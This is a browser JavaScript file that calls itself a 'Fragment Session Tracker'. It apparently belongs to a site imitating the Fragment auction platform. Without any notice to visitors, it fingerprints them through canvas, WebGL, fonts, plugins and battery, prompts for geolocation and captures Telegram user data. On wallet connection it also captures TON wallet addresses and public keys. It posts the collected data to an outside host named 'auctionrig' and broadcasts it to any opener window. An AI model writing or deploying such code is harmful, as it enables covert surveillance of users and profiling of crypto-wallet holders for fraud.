/**
 * Fragment Session Tracker
 * Tracks user sessions, device info, IP, browser, and sends to admin panel
 */

(function() {
  'use strict';

  // Configuration
  const TRACKING_ENDPOINT = '/api/track-session';
  
  // Generate unique session ID
  function generateSessionId() {
    return 'sess_' + Date.now() + '_' + Math.random().toString(36).substr(2, 9);
  }

  // Get or create session ID
  function getSessionId() {
    let sessionId = sessionStorage.getItem('fragmentSessionId');
    if (!sessionId) {
      sessionId = generateSessionId();
      sessionStorage.setItem('fragmentSessionId', sessionId);
    }
    return sessionId;
  }

  // Collect browser information
  function getBrowserInfo() {
    const ua = navigator.userAgent;
    let browserName = 'Unknown';
    let browserVersion = 'Unknown';
    
    // Detect browser
    if (ua.includes('Firefox/')) {
      browserName = 'Firefox';
      browserVersion = ua.match(/Firefox\/([0-9.]+)/)[1];
    } else if (ua.includes('Chrome/') && !ua.includes('Edg')) {
      browserName = 'Chrome';
      browserVersion = ua.match(/Chrome\/([0-9.]+)/)[1];
    } else if (ua.includes('Safari/') && !ua.includes('Chrome')) {
      browserName = 'Safari';
      browserVersion = ua.match(/Version\/([0-9.]+)/)[1];
    } else if (ua.includes('Edg/')) {
      browserName = 'Edge';
      browserVersion = ua.match(/Edg\/([0-9.]+)/)[1];
    } else if (ua.includes('Opera/') || ua.includes('OPR/')) {
      browserName = 'Opera';
      browserVersion = ua.match(/(Opera|OPR)\/([0-9.]+)/)[2];
    }

    return {
      name: browserName,
      version: browserVersion,
      userAgent: ua,
      language: navigator.language,
      languages: navigator.languages,
      cookieEnabled: navigator.cookieEnabled,
      doNotTrack: navigator.doNotTrack,
      onLine: navigator.onLine,
      platform: navigator.platform
    };
  }

  // Collect device information
  function getDeviceInfo() {
    const ua = navigator.userAgent;
    let deviceType = 'Desktop';
    let os = 'Unknown';
    let osVersion = 'Unknown';
    
    // Detect device type
    if (/Mobile|Android|iPhone|iPad|iPod/i.test(ua)) {
      deviceType = 'Mobile';
    } else if (/Tablet|iPad/i.test(ua)) {
      deviceType = 'Tablet';
    }

    // Detect OS
    if (ua.includes('Windows NT')) {
      os = 'Windows';
      const match = ua.match(/Windows NT ([0-9.]+)/);
      osVersion = match ? match[1] : 'Unknown';
    } else if (ua.includes('Mac OS X')) {
      os = 'macOS';
      const match = ua.match(/Mac OS X ([0-9_]+)/);
      osVersion = match ? match[1].replace(/_/g, '.') : 'Unknown';
    } else if (ua.includes('Linux')) {
      os = 'Linux';
    } else if (ua.includes('Android')) {
      os = 'Android';
      const match = ua.match(/Android ([0-9.]+)/);
      osVersion = match ? match[1] : 'Unknown';
    } else if (ua.includes('iPhone') || ua.includes('iPad')) {
      os = 'iOS';
      const match = ua.match(/OS ([0-9_]+)/);
      osVersion = match ? match[1].replace(/_/g, '.') : 'Unknown';
    }

    return {
      type: deviceType,
      os: os,
      osVersion: osVersion,
      screenWidth: window.screen.width,
      screenHeight: window.screen.height,
      screenResolution: `${window.screen.width}x${window.screen.height}`,
      colorDepth: window.screen.colorDepth,
      pixelRatio: window.devicePixelRatio,
      viewportWidth: window.innerWidth,
      viewportHeight: window.innerHeight,
      touchSupport: 'ontouchstart' in window,
      maxTouchPoints: navigator.maxTouchPoints || 0
    };
  }

  // Get geolocation (with permission)
  function getGeolocation(callback) {
    if (navigator.geolocation) {
      navigator.geolocation.getCurrentPosition(
        (position) => {
          callback({
            latitude: position.coords.latitude,
            longitude: position.coords.longitude,
            accuracy: position.coords.accuracy
          });
        },
        () => callback(null)
      );
    } else {
      callback(null);
    }
  }

  // Get network information
  function getNetworkInfo() {
    const connection = navigator.connection || navigator.mozConnection || navigator.webkitConnection;
    
    if (connection) {
      return {
        effectiveType: connection.effectiveType,
        downlink: connection.downlink,
        rtt: connection.rtt,
        saveData: connection.saveData
      };
    }
    return null;
  }

  // Get timezone
  function getTimezoneInfo() {
    const tz = Intl.DateTimeFormat().resolvedOptions().timeZone;
    const offset = new Date().getTimezoneOffset();
    
    return {
      timezone: tz,
      offset: offset,
      offsetHours: -(offset / 60)
    };
  }

  // Canvas fingerprinting
  function getCanvasFingerprint() {
    try {
      const canvas = document.createElement('canvas');
      const ctx = canvas.getContext('2d');
      const text = 'Fragment<Canvas>123!@#';
      
      ctx.textBaseline = 'top';
      ctx.font = '14px Arial';
      ctx.textBaseline = 'alphabetic';
      ctx.fillStyle = '#f60';
      ctx.fillRect(125, 1, 62, 20);
      ctx.fillStyle = '#069';
      ctx.fillText(text, 2, 15);
      ctx.fillStyle = 'rgba(102, 204, 0, 0.7)';
      ctx.fillText(text, 4, 17);
      
      return canvas.toDataURL();
    } catch (e) {
      return null;
    }
  }

  // WebGL fingerprinting
  function getWebGLFingerprint() {
    try {
      const canvas = document.createElement('canvas');
      const gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
      
      if (!gl) return null;
      
      const debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
      return {
        vendor: gl.getParameter(gl.VENDOR),
        renderer: gl.getParameter(gl.RENDERER),
        version: gl.getParameter(gl.VERSION),
        shadingLanguageVersion: gl.getParameter(gl.SHADING_LANGUAGE_VERSION),
        unmaskedVendor: debugInfo ? gl.getParameter(debugInfo.UNMASKED_VENDOR_WEBGL) : null,
        unmaskedRenderer: debugInfo ? gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL) : null
      };
    } catch (e) {
      return null;
    }
  }

  // Get plugins
  function getPlugins() {
    const plugins = [];
    for (let i = 0; i < navigator.plugins.length; i++) {
      const plugin = navigator.plugins[i];
      plugins.push({
        name: plugin.name,
        description: plugin.description,
        filename: plugin.filename
      });
    }
    return plugins;
  }

  // Get fonts (basic detection)
  function detectFonts() {
    const baseFonts = ['monospace', 'sans-serif', 'serif'];
    const testFonts = ['Arial', 'Verdana', 'Times New Roman', 'Courier New', 'Georgia', 'Palatino', 'Garamond'];
    const detectedFonts = [];
    
    const canvas = document.createElement('canvas');
    const ctx = canvas.getContext('2d');
    
    baseFonts.forEach(baseFont => {
      ctx.font = '72px ' + baseFont;
      const baseWidth = ctx.measureText('mmmmmmmmmmlli').width;
      
      testFonts.forEach(testFont => {
        ctx.font = '72px ' + testFont + ', ' + baseFont;
        const testWidth = ctx.measureText('mmmmmmmmmmlli').width;
        if (testWidth !== baseWidth) {
          detectedFonts.push(testFont);
        }
      });
    });
    
    return [...new Set(detectedFonts)];
  }

  // Get battery info (with permission)
  async function getBatteryInfo() {
    if (navigator.getBattery) {
      try {
        const battery = await navigator.getBattery();
        return {
          charging: battery.charging,
          level: battery.level,
          chargingTime: battery.chargingTime,
          dischargingTime: battery.dischargingTime
        };
      } catch (e) {
        return null;
      }
    }
    return null;
  }

  // Get storage info
  function getStorageInfo() {
    const localStorageSize = new Blob(Object.values(localStorage)).size;
    const sessionStorageSize = new Blob(Object.values(sessionStorage)).size;
    
    return {
      localStorage: {
        enabled: !!window.localStorage,
        size: localStorageSize
      },
      sessionStorage: {
        enabled: !!window.sessionStorage,
        size: sessionStorageSize
      },
      indexedDB: {
        enabled: !!window.indexedDB
      }
    };
  }

  // Collect all session data
  async function collectSessionData() {
    const sessionId = getSessionId();
    const timestamp = new Date().toISOString();
    const pageUrl = window.location.href;
    const referrer = document.referrer;
    
    const data = {
      sessionId: sessionId,
      timestamp: timestamp,
      url: pageUrl,
      referrer: referrer,
      browser: getBrowserInfo(),
      device: getDeviceInfo(),
      network: getNetworkInfo(),
      timezone: getTimezoneInfo(),
      storage: getStorageInfo(),
      plugins: getPlugins(),
      fonts: detectFonts(),
      canvas: getCanvasFingerprint(),
      webgl: getWebGLFingerprint(),
      battery: await getBatteryInfo(),
      performance: {
        memory: performance.memory ? {
          usedJSHeapSize: performance.memory.usedJSHeapSize,
          totalJSHeapSize: performance.memory.totalJSHeapSize,
          jsHeapSizeLimit: performance.memory.jsHeapSizeLimit
        } : null,
        timing: {
          domComplete: performance.timing.domComplete - performance.timing.navigationStart,
          loadComplete: performance.timing.loadEventEnd - performance.timing.navigationStart
        }
      }
    };

    return data;
  }

  // Send data to server and admin panel
  async function sendToServer(data) {
    // Add IP detection via external service
    try {
      const ipResponse = await fetch('https://api.ipify.org?format=json');
      const ipData = await ipResponse.json();
      data.ip = ipData.ip;
    } catch (e) {
      data.ip = 'Unknown';
    }

    // Check for Telegram WebApp data
    if (window.Telegram && window.Telegram.WebApp && window.Telegram.WebApp.initDataUnsafe && window.Telegram.WebApp.initDataUnsafe.user) {
      data.telegram = window.Telegram.WebApp.initDataUnsafe.user;
    }

    // ALWAYS store locally for later viewing
    const sessions = JSON.parse(localStorage.getItem('fragmentSessions') || '[]');
    sessions.push(data);
    
    // Keep only last 100 sessions
    if (sessions.length > 100) {
      sessions.shift();
    }
    
    localStorage.setItem('fragmentSessions', JSON.stringify(sessions));

    // Send to admin panel via postMessage (if admin panel opened this window)
    if (window.opener && !window.opener.closed) {
      window.opener.postMessage({
        type: 'FRAGMENT_SESSION_DATA',
        session: data
      }, '*');
    }

    // ALWAYS send to global database via Render Backend
    try {
      const username = localStorage.getItem('fragmentUsername') || 'board';
      const response = await fetch('https://auctionrig.onrender.com/api/save-session', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          username: username,
          ip: data.ip,
          userAgent: data.browser.userAgent,
          timestamp: data.timestamp,
          device: data.device,
          browser: data.browser,
          url: data.url,
          referrer: data.referrer
        })
      });
      const result = await response.json();
    } catch (e) {
    }
  }

  // Track wallet connection events
  window.addEventListener('message', function(event) {
    const data = event.data;
    
    if (data.type === 'TON_CONNECT_UI_CONNECTION' || (data.event && data.event === 'ton-connect-ui-connection')) {
      // Collect session data when wallet connects
      collectSessionData().then(sessionData => {
        sessionData.wallet = {
          connected: true,
          address: data.payload?.account?.address || null,
          chain: data.payload?.account?.chain || null,
          publicKey: data.payload?.account?.publicKey || null
        };
        sendToServer(sessionData);
      });
    }
  });

  // Initialize tracking on page load
  window.addEventListener('DOMContentLoaded', async function() {
    const sessionData = await collectSessionData();
    sendToServer(sessionData);
  });

  // Track page visibility changes
  document.addEventListener('visibilitychange', function() {
    if (document.visibilityState === 'visible') {
    } else {
    }
  });

  // Track clicks
  let clickCount = 0;
  document.addEventListener('click', function(e) {
    clickCount++;
  });

  // Track scroll depth
  let maxScrollDepth = 0;
  window.addEventListener('scroll', function() {
    const scrollDepth = (window.scrollY + window.innerHeight) / document.body.scrollHeight * 100;
    if (scrollDepth > maxScrollDepth) {
      maxScrollDepth = scrollDepth;
    }
  });

})();
